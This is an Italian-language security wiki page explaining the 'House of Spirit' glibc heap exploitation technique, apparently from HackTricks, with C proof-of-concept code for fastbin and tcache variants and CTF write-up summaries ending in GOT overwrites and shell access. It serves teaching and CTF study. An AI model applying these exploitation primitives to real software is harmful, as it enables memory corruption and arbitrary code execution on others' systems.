# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

### Codice

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Obiettivo

- Essere in grado di inserire nel tcache / fast bin un indirizzo in modo che sia poi possibile allocarlo

### Requisiti

- Questo attacco richiede che un attaccante sia in grado di creare un paio di fake fast chunks indicando correttamente il value size e poi di poter free il primo fake chunk in modo che entri nel bin.
- Con **tcache (glibc ≥2.26)** l'attacco è ancora più semplice: è necessario solo un fake chunk (nessun next-chunk size check viene eseguito sul percorso tcache) purché il fake chunk sia allineato a 0x10 e il suo campo size rientri in un tcache bin valido (0x20-0x410 su x64).

### Attacco

- Crea fake chunks che aggirano i controlli di sicurezza: ti serviranno fondamentalmente 2 fake chunks che indicano nelle posizioni corrette i valori size appropriati
- In qualche modo fai in modo di free il primo fake chunk così che entri nel fast o tcache bin e poi allocarlo per sovrascrivere quell'indirizzo

**Il codice di** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **è ottimo per capire l'attacco.** Anche se questo schema preso dal codice lo riassume abbastanza bene:

<details>
<summary>Layout del fake chunk</summary>
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
</details>

> [!TIP]
> Nota che è necessario creare il secondo chunk per bypassare alcuni sanity checks.

### Tcache house of spirit (glibc ≥2.26)

- Nelle glibc moderne il **tcache fast-path** chiama `tcache_put` prima di validare la size del chunk successivo/`prev_inuse`, quindi solo il fake chunk corrente deve apparire valido.
- Requisiti:
- Il fake chunk deve essere **16-byte aligned** e non essere marcato `IS_MMAPPED`/`NON_MAIN_ARENA`.
- `size` deve appartenere a una tcache bin e includere il **prev_inuse bit set** (`size | 1`).
- La tcache per quella bin non deve essere piena (default max 7 entries).
- Minimal PoC (stack chunk):
```c
unsigned long long fake[6] __attribute__((aligned(0x10)));
// chunk header at fake[0]; usable data starts at fake+2
fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
void *p = &fake[2];          // points inside fake chunk
free(p);                     // goes straight into tcache
void *q = malloc(0x30);      // returns stack address fake+2
```
- **Safe-linking** non è una barriera qui: il forward pointer memorizzato in tcache è automaticamente codificato come `fd = ptr ^ (heap_base >> 12)` durante `free`, quindi l'attaccante non deve conoscere la chiave quando usa un singolo fake chunk.
- Questa variante è utile quando glibc hooks sono stati rimossi (≥2.34) e vuoi una fast arbitrary write o sovrapporre un buffer target (e.g., stack/BSS) con un tcache chunk senza creare corruzioni aggiuntive.

## Esempi

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: Via un overflow è possibile cambiare un puntatore per farlo puntare a un indirizzo GOT al fine di ottenere un leak di un indirizzo libc tramite l'azione di read del CTF
- **House of Spirit**: Abusando di un contatore che conta il numero di "rifles" è possibile generare una fake size del primo fake chunk, poi abusando di un "message" è possibile fingere la seconda size di un chunk e infine, abusando di un overflow, è possibile cambiare un puntatore che verrà freed così che il nostro primo fake chunk venga freed. Poi possiamo allocarlo e al suo interno ci sarà l'indirizzo di dove è memorizzato il "message". È poi possibile fare in modo che questo punti alla voce `scanf` dentro la tabella GOT, così da sovrascriverla con l'indirizzo di system. La prossima volta che `scanf` viene chiamato, possiamo inviare l'input `"/bin/sh"` e ottenere una shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Buffer di stack non inizializzato.
- **House of Spirit**: Possiamo modificare il primo indice di un array globale di puntatori heap. Con una modifica di un singolo byte usiamo `free` su un fake chunk all'interno di un chunk valido, ottenendo una situazione di chunk sovrapposti dopo una nuova allocazione. Con ciò, un semplice Tcache poisoning attack funziona per ottenere un arbitrary write primitive.

## Riferimenti

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)

{{#include ../../banners/hacktricks-training.md}}
